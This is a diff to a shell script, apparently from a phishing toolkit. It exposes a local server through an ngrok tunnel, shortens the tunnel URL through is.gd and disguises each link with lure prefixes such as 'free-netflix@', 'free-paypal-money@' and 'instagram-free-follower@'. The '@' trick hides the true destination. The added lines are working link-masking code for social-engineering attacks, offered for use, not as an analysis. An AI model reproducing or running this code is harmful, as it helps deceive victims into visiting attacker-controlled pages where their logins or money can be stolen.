@@ -51,6 +51,27 @@ echo -e "[${Green}✔${clear}] ${IYellow}GENERATING LINK PLEASE WAIT... ${clear}
 $HOME/ngrok http 5555 > /dev/null 2>&1 &
 sleep 7
 #below lines can be sued for generating direct link.
-ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
-echo -e "\t${IGreen}├──${clear} ${Green}$ngrok_link ${clear}"
-echo -e "\t${IGreen}└──${clear} ${Green}http://localhost:5555 ${clear}"
+url=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 01: https://netflix-free-account@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 02: https://free-password-access@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 03: https://free-netflix@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 04: https://free-proxylist@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 05: https://free-paypal-money@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 06: https://request-free-iphone@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 07: https://free-page-liker@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 08: https://instagram-free-follower@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 09: https://instagram-real-likes-100k@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 10: https://photo-editor-free@#g"
+echo
+curl -s https://is.gd/create.php\?format\=simple\&url\=$(echo -e "$url")|sed 's#https://##g'|sed "s#^#URL 11: https://private-videos@#g"
+echo
+
